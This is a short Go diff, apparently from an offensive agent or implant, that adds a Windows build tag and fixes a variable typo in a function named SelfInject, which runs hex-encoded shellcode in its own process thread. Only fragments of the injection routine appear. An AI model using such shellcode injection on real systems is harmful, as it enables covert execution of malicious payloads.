@@ -1,3 +1,4 @@
+//go:build windows
 // +build windows
 
 package agentfuncs
@@ -39,7 +40,7 @@ func SelfInject(shellcodeHex string) string {
 	defer windows.CloseHandle(threadHandle)
 
 	// Wait for our thread to exit to prevent program from closing before the shellcode ends
-	_, err = windows.WaitForSingleObject(theadHandle, syscall.INFINITE)
+	_, err = windows.WaitForSingleObject(threadHandle, syscall.INFINITE)
 	if err != nil {
 		return "[!] Failed to waitForSingleObject: " + err.Error()
 	}
